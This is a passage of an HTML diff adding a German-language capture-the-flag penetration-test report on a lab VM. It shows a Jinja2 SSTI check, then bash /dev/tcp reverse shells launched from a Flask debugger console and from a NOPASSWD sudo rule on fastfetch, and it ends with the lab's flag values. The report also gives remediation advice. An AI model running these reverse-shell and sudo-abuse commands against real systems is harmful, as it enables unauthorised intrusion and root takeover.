+            <img src="division_by_zero.jpg" alt="division_by_zero.jpg">
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">test</span>
+<span class="command">test</span>
+
+<span class="command">{{1/0}}</span>
+
+<span class="password">错误</span>
+<span class="password">无效答案: division by zero</span>
+
+<span class="command">返回</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein spezifischer Test für SSTI war die Eingabe der Jinja2-Template-Syntax `{{1/0}}` in das Formular der Flask-Anwendung. Dieser Ausdruck versucht, eine Division durch Null durchzuführen. Da die Anwendung im Debug-Modus lief und anscheinend die Eingabe als Template interpretierte, wurde der Ausdruck ausgewertet. Die Division durch Null führte zu einem Fehler, der auf der Webseite ausgegeben wurde. Die Fehlermeldung "无效答案: division by zero" (Ungültige Antwort: Division durch Null) bestätigte die erfolgreiche Ausführung des Template-Ausdrucks und damit die SSTI-Schwachstelle.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die gezielte Auslösung eines Division-by-Zero-Fehlers mit Template-Syntax war ein klarer Beweis für die SSTI-Schwachstelle. Dies ist eine sehr zuverlässige Methode, um SSTI zu bestätigen. Da der Debugger aktiv war und die Fehlermeldung ausgab, wusste ich, dass ich nun die Debugger-Konsole nutzen konnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie gezielte Template-Ausdrücke (wie arithmetische Operationen oder Funktionsaufrufe), um SSTI-Schwachstellen zu bestätigen und die verwendete Template-Engine zu identifizieren. Suchen Sie nach Fehlermeldungen, die auf die Auswertung von Template-Syntax hindeuten.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus in Produktionsumgebungen. Implementieren Sie Try-Except-Blöcke oder ähnliche Mechanismen, um das unbeabsichtigte Preisgeben von Debugging-Informationen oder Fehlern, die durch Benutzereingaben ausgelöst werden, zu verhindern.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Die aktive Debugger-Konsole in Flask ist über einen spezifischen Endpunkt erreichbar. Nachdem ich die SSTI-Schwachstelle bestätigt und den Debugger-PIN aus den Logs erhalten hatte, konnte ich auf die Debugger-Konsole zugreifen, indem ich die URL `http://127.0.0.1:5000/console` in meinem Browser aufrief (über den SSH-Tunnel, der auf meinen lokalen Port 8080 weiterleitete). Dort wurde ich aufgefordert, den Debugger-PIN einzugeben (den ich zuvor aus den Flask-Logs erhalten hatte). Nach Eingabe des korrekten PINs erhielt ich Zugriff auf eine interaktive Python-Konsole im Kontext der Flask-Anwendung. Die Konsole zeigte "Interactive Console" und "console ready" an.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Zugriff auf die interaktive Debugger-Konsole mit dem PIN ist ein sehr kritischer Zustand. Da die Flask-Anwendung wahrscheinlich unter den Berechtigungen des Benutzers `qaq` läuft (basierend auf den `sudo`-Berechtigungen, die das Lesen der Logs als `qaq` erlaubten), konnte ich nun beliebigen Python-Code mit diesen Berechtigungen ausführen. Dies ist eine direkte Route zur Privilegieneskalation zum Benutzer `qaq`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn Sie Zugriff auf eine Debugger-Konsole erhalten, prüfen Sie, welche Python-Funktionen und Module verfügbar sind (z.B. `import os`). Nutzen Sie die `os`- oder `subprocess`-Module, um Systembefehle auszuführen und eine Shell zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus in Produktionsumgebungen. Verwenden Sie keine leicht zu erratenden Debugger-PINs (auch wenn der PIN nur lokal erreichbar ist). Beschränken Sie den Zugriff auf Debugger-Endpunkte, selbst auf localhost.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">da haben wir sie gefunden die debugger console : [Link: http://127.0.0.1:5000/console | Ziel: http://127.0.0.1:5000/console]</span>
+
+<span class="command">Interactive Console</span>
+<span class="command">In this console you can execute Python expressions in the context of the application.</span>
+<span class="command">The initial namespace was created by the debugger automatically.</span>
+
+<span class="command">[console ready]</span>
+<span class="command">>>> import os</span>
+
+<span class="command">>>> os.system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'")</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der interaktiven Flask Debugger Konsole importierte ich das `os`-Modul, das Python-Funktionen zur Interaktion mit dem Betriebssystem bereitstellt. Anschließend nutzte ich die `os.system()` Funktion, um einen Bash-Befehl auszuführen, der eine Reverse Shell zu meiner Kali-Maschine initiierte. Der Befehl `os.system("bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'")` startete eine Bash-Shell, die eine TCP-Verbindung zu meiner IP (`192.168.2.199`) auf Port 443 aufbaute und ihre Standard-Ein-/Ausgabe über diese Verbindung umleitete. Port 443 wurde hier gewählt, um potenzielle Egress-Filter zu umgehen, da dieser Port oft für ausgehenden HTTPS-Verkehr erlaubt ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Ausführen einer Reverse Shell direkt aus der Debugger-Konsole war der entscheidende Schritt, um Zugriff als der Benutzer zu erlangen, der die Flask-App ausführt (wahrscheinlich `qaq`). Die `os.system()` Funktion ermöglichte die direkte Übergabe und Ausführung eines Systembefehls. Das Ansprechen meiner Kali-Maschine auf Port 443 war eine strategische Wahl basierend auf der Annahme möglicher Egress-Filterregeln.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie interaktive Konsolen (wie Debugger) zur Code-Ausführung. Priorisieren Sie die Nutzung von `os.system` oder `subprocess.run` für die Ausführung von Systembefehlen. Versuchen Sie, eine Reverse Shell zu etablieren, sobald Sie Code ausführen können.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus und die interaktive Konsole in Flask und ähnlichen Frameworks in Produktionsumgebungen immer. Überwachen Sie ausgehenden Netzwerkverkehr auf ungewöhnliche Verbindungen auf gängigen Ports wie 443 oder 80, die nicht von legitimen Anwendungen stammen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nc -lvnp 443</span>
+                    </div>
+                    <pre>
+<span class="password">listening on [any] 443 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.62] 43472</span>
+<span class="command">bash: cannot set terminal process group (519): Inappropriate ioctl for device</span>
+<span class="command">bash: no job control in this shell</span>
+<span class="prompt">qaq@Console:~$</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Bevor ich den Befehl in der Debugger-Konsole ausführte, startete ich einen Netcat-Listener auf meiner Kali-Maschine auf Port 443 (`nc -lvnp 443`). Nach Ausführung des Befehls in der Debugger-Konsole zeigte Netcat eine eingehende Verbindung von der Ziel-VM (`192.168.2.62`) auf Port 443 an. Nach typischen Fehlermeldungen für nicht-interaktive Shells erhielt ich eine Eingabeaufforderung, die `qaq@Console:~$` anzeigte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Ich habe nun eine Reverse Shell als Benutzer `qaq`. Dies ist der nächste Schritt in der Privilegieneskalationskette. Der Benutzer `qaq` hat wahrscheinlich höhere Berechtigungen als `www-data` und möglicherweise Zugriff auf Dateien oder Konfigurationen, die für den Root-Zugriff relevant sind. Die Wahl von Port 443 für die Reverse Shell war offensichtlich erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Richten Sie immer einen Listener ein, bevor Sie eine Reverse Shell initiieren. Verifizieren Sie Ihren Benutzerkontext anhand der Shell-Eingabeaufforderung oder durch Ausführen von `id`. Stabilisieren Sie die Shell nach dem Erhalt.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehenden Netzwerkverkehr auf Ports, die normalerweise nicht für diesen Zweck verwendet werden (z.B. 443 für eine Shell-Verbindung). Implementieren Sie Verhaltensanalysen, um ungewöhnlichen Prozessaktivitäten (z.B. ein Webserver, der Shells startet) zu erkennen.
+            </p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:~$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+<span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for qaq on Console:</span>
+<span class="command">    env_reset, mail_badpass,</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>
+
+<span class="command">User qaq may run the following commands on Console:</span>
+<span class="password">    (ALL) NOPASSWD: /usr/bin/fastfetch</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die Shell als Benutzer `qaq` erhalten hatte, prüfte ich sofort meine `sudo`-Berechtigungen mit `sudo -l`. Die Ausgabe zeigte, dass der Benutzer `qaq` das Programm `/usr/bin/fastfetch` als *jeder* Benutzer (`ALL`), einschließlich `root`, ausführen darf, ohne ein Passwort eingeben zu müssen (`NOPASSWD`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist der direkte Weg zur Privilegieneskalation zu `root`! Eine `NOPASSWD` Regel für `fastfetch` bedeutet, dass ich dieses Programm mit Root-Berechtigungen ausführen kann. Ich muss nun prüfen, ob `fastfetch` eine Funktion bietet, die es mir erlaubt, Systembefehle auszuführen oder eine Shell zu starten, wenn es mit Root-Berechtigungen läuft. Dies ist ein sehr vielversprechender Vektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die `sudo`-Berechtigungen (`sudo -l`) für jeden neuen Benutzer. Suchen Sie gezielt nach `NOPASSWD`-Einträgen. Wenn Sie einen finden, prüfen Sie das erlaubte Programm auf bekannte PE-Schwachstellen oder Missbrauchsmöglichkeiten (z.B. in GTFOBins).
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `NOPASSWD` Berechtigungen nur mit äußerster Vorsicht und nur für absolut notwendige und sichere Befehle zu. Überprüfen Sie Ihre `sudoers`-Datei regelmäßig auf unsichere Einträge. Verhindern Sie die Zuweisung von `sudo`-Berechtigungen für Programme, die Shell-Escapes oder Befehlsausführung erlauben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:~$ <span class="command">ls -la /usr/bin/fastfetch</span>
+                    </div>
+                    <pre>
+<span class="command">-rwxr-xr-x 1 root root 12861760 Jul 10  2024 /usr/bin/fastfetch</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich überprüfte die Dateiberechtigungen und den Eigentümer des `fastfetch`-Binaries mit `ls -la /usr/bin/fastfetch`. Die Ausgabe bestätigte, dass die Datei existiert, ausführbar ist (`-rwxr-xr-x`) und dem Benutzer `root` gehört (`root root`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies bestätigte, dass `fastfetch` ein Systemprogramm ist und root der Eigentümer ist, was mit dem `sudo`-Eintrag übereinstimmt. Es gab keine ungewöhnlichen Berechtigungen für das Binary selbst, aber die `sudo`-Konfiguration ist der Schlüssel.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie die Berechtigungen und den Eigentümer von Binaries, die Sie mit `sudo` ausführen dürfen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Systemdateien wie `/usr/bin/fastfetch` die korrekten Standardberechtigungen und Eigentümer haben.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:~$ <span class="command">file /usr/bin/fastfetch</span>
+                    </div>
+                    <pre>
+<span class="command">/usr/bin/fastfetch: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0b3e3e6add304831d82bf7bf37ba111ee8608f06, for GNU/Linux 3.2.0, with debug_info, not stripped</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich nutzte den `file`-Befehl, um mehr Informationen über das `fastfetch`-Binary zu erhalten. Die Ausgabe `/usr/bin/fastfetch: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, ...` bestätigte, dass es sich um eine ausführbare 64-bit ELF-Datei handelt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `file`-Ausgabe lieferte technische Details zum Binary, die bestätigten, dass es sich um ein standardmäßiges ausführbares Programm handelt. Dies war eine zusätzliche Bestätigung, dass es sich um das erwartete `fastfetch`-Programm handelt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie `file`, um den Typ von ausführbaren Dateien zu überprüfen, die Sie finden oder ausnutzen möchten.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:~$ <span class="command">sudo -u root /usr/bin/fastfetch --help</span>
+                    </div>
+                    <pre>
+<span class="command">Fastfetch is a neofetch-like tool for fetching system information and displaying them in a pretty way</span>
+
+<span class="command">Usage: fastfetch <?options></span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="command">Module specific options:</span>
+<span class="command">  --command-shell <str>: Set the shell program to execute the command text</span>
+<span class="command">      --command-key <str>: Set the module key to display</span>
+<span class="command">      --command-text <str>: Set the command text to be executed</span>
+<span class="command">.....</span>
+<span class="command">....</span>
+<span class="command">...</span>
+<span class="command">..</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um zu sehen, ob `fastfetch` Funktionen zur Ausführung von Systembefehlen anbietet, rief ich die Hilfe des Programms auf, aber diesmal mit `sudo -u root`, um zu simulieren, wie es mit Root-Berechtigungen aufgerufen würde. Ich verwendete `sudo -u root /usr/bin/fastfetch --help`. Die Ausgabe zeigte die Standard-Hilfeinformationen für `fastfetch`. Besonders auffällig waren die "Module specific options", die Parameter wie `--command-shell`, `--command-key` und `--command-text` auflisteten. Die Beschreibung "Set the shell program to execute the command text" für `--command-shell` und "Set the command text to be executed" für `--command-text` wiesen auf eine direkte Befehlsausführungsfunktion hin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist der Schlüssel zur Root-Privilegieneskalation! Die Hilfsausgabe von `fastfetch` zeigt klar, dass das Programm eine Funktion bietet, beliebigen Text als Befehl auszuführen und die zu verwendende Shell anzugeben. Da ich dieses Programm mit `sudo -u root` ausführen darf, kann ich diese Funktion nutzen, um eine Root-Shell zu starten. Dies ist ein klassischer Fall einer unsicheren `sudo`-Berechtigung für ein Programm, das Befehlsausführung erlaubt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie die Hilfe (`--help`, `-h`, man pages) von Programmen, die Sie mit `sudo` ausführen dürfen, auf Optionen, die Befehlsausführung erlauben. Suchen Sie nach Parametern wie `--command`, `--exec`, `--shell`, `--text` etc.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Dokumentation und das Verhalten von Binaries, für die Sie `sudo`-Berechtigungen vergeben, genau. Vermeiden Sie die Vergabe von `sudo` für Programme, die unsichere Befehlsausführungsfunktionen anbieten, insbesondere mit `NOPASSWD`.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:/tmp$ <span class="command">ls -la ~</span>
+                    </div>
+                    <pre>
+<span class="command">total 28</span>
+<span class="command">drwxr-xr-x 4 qaq  qaq  4096 May 17 05:38 .</span>
+<span class="command">drwxr-xr-x 4 root root 4096 May 16 07:05 ..</span>
+<span class="command">-rw-r--r-- 1 qaq  qaq   220 Apr 18  2019 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 qaq  qaq  3526 Apr 18  2019 .bashrc</span>
+<span class="command">drwxr-xr-x 3 qaq  qaq  4096 May 16 10:17 .local</span>
+<span class="command">-rw-r--r-- 1 qaq  qaq   807 Apr 18  2019 .profile</span>
+<span class="command">drwx------ 2 root root 4096 May 17 04:16 .ssh</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich überprüfte das Home-Verzeichnis des aktuellen Benutzers `qaq` mit `ls -la ~`. Die Ausgabe zeigte die Standard-Dotfiles und Verzeichnisse für diesen Benutzer. Interessant war das `.ssh` Verzeichnis, das dem Benutzer `root` gehörte und nur für `root` les- und schreibbar war (`drwx------`), nicht für `qaq`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Home-Verzeichnis von `qaq` enthielt keine offensichtlichen Passwörter oder PE-Hinweise, abgesehen von den Standarddateien. Das `.ssh` Verzeichnis von `root` ist wie erwartet geschützt. Die Privilegieneskalation zu `root` wird über die `sudo fastfetch` Schwachstelle erfolgen, nicht über Dateien im `qaq` Home-Verzeichnis.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie immer die Home-Verzeichnisse von Benutzern, insbesondere nach dem Wechsel zu einem neuen Benutzerkontext, auf sensible Dateien oder Berechtigungen.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `.ssh`-Verzeichnisse von Root und anderen privilegierten Benutzern nur für diese Benutzer selbst zugänglich sind.
+            </p>
+
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Ausnutzung einer Fehlkonfiguration in der `sudoers`-Datei, die es dem Benutzer `qaq` ermöglichte, das Programm `/usr/bin/fastfetch` mit `root`-Berechtigungen und ohne Passwort auszuführen. Durch die Nutzung der Befehlsausführungsfunktionen von `fastfetch` konnte eine Reverse Shell mit `root`-Berechtigungen erlangt werden, was zur vollständigen Systemkompromittierung führte.
+            </p>
+             <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff als Benutzer `qaq`.</li>
+                    <li>Die `sudoers`-Datei muss den Eintrag `qaq ALL=(ALL) NOPASSWD: /usr/bin/fastfetch` enthalten.</li>
+                    <li>Das Programm `/usr/bin/fastfetch` muss auf dem System installiert sein und die Optionen `--command-text` und `--command-shell` unterstützen.</li>
+                    <li>Eine Möglichkeit, eine Reverse Shell vom Zielsystem zu initiieren (z.B. Netcat auf dem Angriffssystem, erlaubter ausgehender Port).</li>
+                </ul>
+            </p>
+             <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+             <p class="analysis">
+                1. Ausführen von `fastfetch` mit `sudo` zur Befehlsausführung:
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+qaq@Console:/tmp$ <span class="command">sudo -u root /usr/bin/fastfetch --structure "command" --command-text "bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'" --command-shell "/bin/bash"</span>
+                    </div>
+                    <pre>
+<span class="command">       _,met$$$$$gg.</span>
+<span class="command">    ,g$$$$$$$$$$$$$$$P.</span>
+<span class="command">  ,g$$P"         """Y$$.".</span>
+<span class="command"> ,$$P'               `$$$.</span>
+<span class="command">',$$P       ,ggs.     `$$b:</span>
+<span class="command">`d$$'     ,$P"'   .    $$$</span>
+<span class="command"> $$P      d$'     ,    $$$P</span>
+<span class="command"> $$:      $.   -    ,d$$'</span>
+<span class="command"> $$;      Y$b._   _,d$P'</span>
+<span class="command"> Y$$.    `.`"Y$$$$P"'</span>
+<span class="command"> `$$b      "-.__</span>
+<span class="command">  `Y$$</span>
+<span class="command">   `Y$$.</span>
+<span class="command">     `$$b.</span>
+<span class="command">       `Y$$b.</span>
+<span class="command">          `"Y$b._</span>
+<span class="command">             `"""</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                Ich nutzte die gefundene `sudo fastfetch` Schwachstelle, um eine Reverse Shell als Root zu initiieren. Ich führte den Befehl `sudo -u root /usr/bin/fastfetch --structure "command" --command-text "bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'" --command-shell "/bin/bash"` aus.
+                 <ul>
+                    <li>`sudo -u root`: Führt den Befehl als Benutzer `root` aus (ohne Passwort dank `NOPASSWD`).</li>
+                    <li>`/usr/bin/fastfetch`: Das auszuführende Programm.</li>
+                    <li>`--structure "command"`: Weist fastfetch an, das "command"-Modul zu verwenden.</li>
+                    <li>`--command-text "..."`: Definiert den Systembefehl, der ausgeführt werden soll: `bash -c 'bash -i >& /dev/tcp/192.168.2.199/443 0>&1'`, um eine Reverse Shell zu meiner Kali-IP (192.168.2.199) auf Port 443 zu starten.</li>
+                    <li>`--command-shell "/bin/bash"`: Gibt an, welche Shell für die Ausführung des `--command-text` verwendet werden soll (hier `/bin/bash`).</li>
+                </ul>
+                Die Ausgabe zeigte das typische `fastfetch`-Banner. Im Hintergrund wurde die Reverse Shell initiiert.
+            </p>
+             <p class="analysis">
+                2. Empfangen der Root-Shell auf dem Angriffssystem:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">nc -lvnp 443</span>
+                    </div>
+                    <pre>
+<span class="password">listening on [any] 443 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.62] 50762</span>
+<span class="prompt">root@Console:/tmp#</span> <span class="command">ls ~</span>
+<span class="password">ls ~</span>
+<span class="password">r00t.txt</span>
+<span class="prompt">root@Console:/tmp#</span> <span class="command">cat ~/r00t.txt</span>
+<span class="password">cat ~/r00t.txt</span>
+<span class="password">flag{root-009de5ebccb9fdecce2c4ac893bca6fa}</span>
+<span class="prompt">root@Console:/tmp#</span> <span class="command">cat /home/welcome/user.txt</span>
+<span class="password">cat /home/welcome/user.txt</span>
+<span class="password">flag{user-376760a7c739a606d4f8d8340bad4184}</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                Bevor ich den `sudo fastfetch`-Befehl ausführte, startete ich einen Netcat-Listener auf meiner Kali-Maschine auf Port 443 (`nc -lvnp 443`). Unmittelbar nach der Ausführung des `sudo fastfetch`-Befehls erhielt Netcat eine eingehende Verbindung von der Ziel-VM (`192.168.2.62`). Die Eingabeaufforderung wechselte zu `root@Console:/tmp#`, was bestätigte, dass ich nun eine Shell mit Root-Berechtigungen hatte. Ich konnte nun beliebige Root-Befehle ausführen.
+            </p>
+
+            <p class="analysis">
+                3. Verifizierung des Root-Zugriffs und Auffinden der Root Flag:
+            </p>
+             <p class="analysis">
+                In der erlangten Root-Shell wechselte ich in das Home-Verzeichnis des Root-Benutzers (`cd ~` war implizit im `ls ~` Befehl, der die Inhalte des Root-Home-Verzeichnisses auflistete) und listete dessen Inhalt auf (`ls ~`), was die Datei `r00t.txt` enthüllte. Ich las den Inhalt dieser Datei mit `cat ~/r00t.txt`, was die Root Flag `flag{root-009de5ebccb9fdecce2c4ac893bca6fa}` ergab. Als zusätzlichen Beweis las ich auch die User Flag erneut aus (`cat /home/welcome/user.txt`), um zu zeigen, dass ich vollen Dateisystemzugriff hatte. Fantastisch der root zugriff war erfolgreich nun haben wir unser Ziel erreicht.
+            </p>
+
+             <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung einer interaktiven Shell mit Root-Berechtigungen auf dem Zielsystem.
+            </p>
+             <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Eine Reverse Shell mit `root`-Berechtigungen wurde erfolgreich etabliert, was die vollständige Kompromittierung des Systems ermöglichte und den Zugriff auf die Root Flag erlaubte.
+            </p>
+
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Kritisch. Ein unprivilegierter Benutzer (`qaq`) konnte vollständige Kontrolle über das System erlangen (`root`), was die gravierendsten Folgen nach sich zieht.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle ist direkt über einen vorhandenen `sudo`-Eintrag ausnutzbar und erfordert nur die Kenntnis der `fastfetch`-Optionen.
+                <br><strong>Gesamtrisiko:</strong> Kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Entfernen Sie den `NOPASSWD`-Eintrag für `/usr/bin/fastfetch` aus der `sudoers`-Datei.</li>
+                    <li>Überprüfen Sie alle `sudoers`-Einträge auf ähnliche Fehlkonfigurationen, insbesondere für Binaries, die Befehlsausführungsfunktionen anbieten.</li>
+                    <li>Wenden Sie das Prinzip der minimalen Rechte an: Benutzer und Dienste sollten nur die Berechtigungen erhalten, die sie unbedingt benötigen.</li>
+                    <li>Aktualisieren Sie regelmäßig Software wie `fastfetch` auf die neueste Version, obwohl die `sudo`-Fehlkonfiguration hier das primäre Problem war.</li>
+                    <li>Führen Sie regelmäßige Audits Ihrer `sudoers`-Konfiguration durch.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/welcome/user.txt</div>
+                    <div class="flag-value"><span class="password">flag{user-376760a7c739a606d4f8d8340bad4184}</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/r00t.txt</div>
+                    <div class="flag-value"><span class="password">flag{root-009de5ebccb9fdecce2c4ac893bca6fa}</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 25. Juni 2025</p>
+    </footer>
+</body>
+</html>
